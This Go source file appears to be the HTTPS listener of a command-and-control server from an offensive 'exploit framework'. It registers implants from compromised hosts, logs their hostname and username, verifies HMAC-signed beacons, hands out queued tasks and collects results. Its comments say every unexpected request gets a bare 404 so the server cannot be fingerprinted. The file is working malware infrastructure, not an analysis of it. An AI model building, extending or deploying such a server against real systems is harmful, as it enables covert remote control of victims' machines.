package listeners

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"sync"
	"time"

	zcrypto "github.com/KKingZero/erebus-exploit-framwork/pkg/crypto"
	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"github.com/KKingZero/erebus-exploit-framwork/server/sessions"
	"github.com/KKingZero/erebus-exploit-framwork/server/tasks"
	"google.golang.org/protobuf/proto"
)

// BeaconHandler processes Register and Beacon messages from implants.
type BeaconHandler struct {
	Sessions   *sessions.Manager
	Dispatcher *tasks.Dispatcher
	Secret     []byte // Pre-shared secret for HMAC validation
	OnEvent    tasks.EventCallback
}

// HTTPSListener is an HTTPS listener for implant callbacks.
type HTTPSListener struct {
	id        string
	name      string
	host      string
	port      uint32
	server    *http.Server
	handler   *BeaconHandler
	tlsCert   tls.Certificate
	startedAt time.Time
	active    bool
	mu        sync.Mutex
}

func NewHTTPSListener(config *pb.ListenerConfig, handler *BeaconHandler, ca *zcrypto.CertificateAuthority) (*HTTPSListener, error) {
	hosts := []string{config.Host}
	if config.Host == "" || config.Host == "0.0.0.0" {
		hosts = []string{"localhost", "127.0.0.1"}
	}

	tlsCert, _, err := ca.GenerateServerCert(hosts)
	if err != nil {
		return nil, fmt.Errorf("generate server cert: %w", err)
	}

	id := config.Id
	if id == "" {
		var err2 error
		id, err2 = zcrypto.RandomID(8)
		if err2 != nil {
			return nil, fmt.Errorf("generate listener ID: %w", err2)
		}
	}

	return &HTTPSListener{
		id:      id,
		name:    config.Name,
		host:    config.Host,
		port:    config.Port,
		handler: handler,
		tlsCert: tlsCert,
	}, nil
}

func (l *HTTPSListener) ID() string                    { return l.id }
func (l *HTTPSListener) Name() string                  { return l.name }
func (l *HTTPSListener) Protocol() pb.ListenerProtocol { return pb.ListenerProtocol_LISTENER_HTTPS }
func (l *HTTPSListener) Address() string               { return fmt.Sprintf("%s:%d", l.host, l.port) }

func (l *HTTPSListener) Status() *pb.ListenerStatus {
	l.mu.Lock()
	defer l.mu.Unlock()
	return &pb.ListenerStatus{
		Id:        l.id,
		Name:      l.name,
		Protocol:  pb.ListenerProtocol_LISTENER_HTTPS,
		Address:   l.Address(),
		Active:    l.active,
		StartedAt: l.startedAt.Unix(),
	}
}

func (l *HTTPSListener) Start() error {
	mux := http.NewServeMux()
	mux.HandleFunc("/register", l.handleRegister)
	mux.HandleFunc("/beacon", l.handleBeacon)
	// Catch-all returns 404 for anything else (no fingerprinting)
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		http.NotFound(w, r)
	})

	l.server = &http.Server{
		Addr:    l.Address(),
		Handler: mux,
		TLSConfig: &tls.Config{
			Certificates: []tls.Certificate{l.tlsCert},
			MinVersion:   tls.VersionTLS12,
		},
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 30 * time.Second,
	}

	ln, err := net.Listen("tcp", l.Address())
	if err != nil {
		return fmt.Errorf("listen: %w", err)
	}

	tlsLn := tls.NewListener(ln, l.server.TLSConfig)

	l.mu.Lock()
	l.active = true
	l.startedAt = time.Now()
	l.mu.Unlock()

	go func() {
		log.Printf("[https] listener started on %s", l.Address())
		if err := l.server.Serve(tlsLn); err != nil && err != http.ErrServerClosed {
			log.Printf("[https] serve error: %v", err)
		}
		l.mu.Lock()
		l.active = false
		l.mu.Unlock()
	}()

	return nil
}

func (l *HTTPSListener) Stop() error {
	l.mu.Lock()
	defer l.mu.Unlock()
	if l.server == nil || !l.active {
		return nil
	}
	l.active = false
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	return l.server.Shutdown(ctx)
}

func (l *HTTPSListener) handleRegister(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.NotFound(w, r)
		return
	}

	body, err := io.ReadAll(io.LimitReader(r.Body, 1<<16))
	if err != nil {
		http.NotFound(w, r)
		return
	}

	reg := &pb.Register{}
	if err := proto.Unmarshal(body, reg); err != nil {
		// Silent drop — no fingerprinting
		http.NotFound(w, r)
		return
	}

	// Verify HMAC
	if err := zcrypto.VerifyHMAC(l.handler.Secret, reg.ImplantId, reg.Timestamp, reg.Hmac, 30); err != nil {
		// Silent drop
		http.NotFound(w, r)
		return
	}

	sess := sessions.NewSession(reg, "https", r.RemoteAddr)
	sessionID, err := l.handler.Sessions.Register(sess)
	if err != nil {
		log.Printf("[https] register error: %v", err)
		http.NotFound(w, r)
		return
	}

	log.Printf("[https] new session: %s (implant=%s, host=%s, user=%s)",
		sessionID, reg.ImplantId, reg.Hostname, reg.Username)

	if l.handler.OnEvent != nil {
		l.handler.OnEvent(&pb.Event{
			Type:      pb.EventType_EVENT_SESSION_NEW,
			Timestamp: time.Now().Unix(),
			SessionId: sessionID,
			Message:   fmt.Sprintf("New session from %s@%s", reg.Username, reg.Hostname),
		})
	}

	resp := &pb.RegisterResponse{
		Success:      true,
		SessionId:    sessionID,
		NextCheckinMs: 5000,
	}

	data, _ := proto.Marshal(resp)
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Write(data)
}

func (l *HTTPSListener) handleBeacon(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.NotFound(w, r)
		return
	}

	body, err := io.ReadAll(io.LimitReader(r.Body, 1<<20))
	if err != nil {
		http.NotFound(w, r)
		return
	}

	beacon := &pb.Beacon{}
	if err := proto.Unmarshal(body, beacon); err != nil {
		http.NotFound(w, r)
		return
	}

	// Verify HMAC
	if err := zcrypto.VerifyHMAC(l.handler.Secret, beacon.ImplantId, beacon.Timestamp, beacon.Hmac, 30); err != nil {
		http.NotFound(w, r)
		return
	}

	sess, ok := l.handler.Sessions.GetByImplant(beacon.ImplantId)
	if !ok {
		http.NotFound(w, r)
		return
	}

	// Update checkin
	l.handler.Sessions.UpdateCheckin(sess.SessionID)

	// Process results
	for _, result := range beacon.Results {
		l.handler.Dispatcher.HandleResult(result)
	}

	// Drain pending tasks
	pendingTasks := sess.DrainTasks()

	resp := &pb.BeaconResponse{
		Tasks:         pendingTasks,
		NextCheckinMs: 5000,
		Terminate:     !sess.IsAlive(),
	}

	data, _ := proto.Marshal(resp)
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Write(data)
}
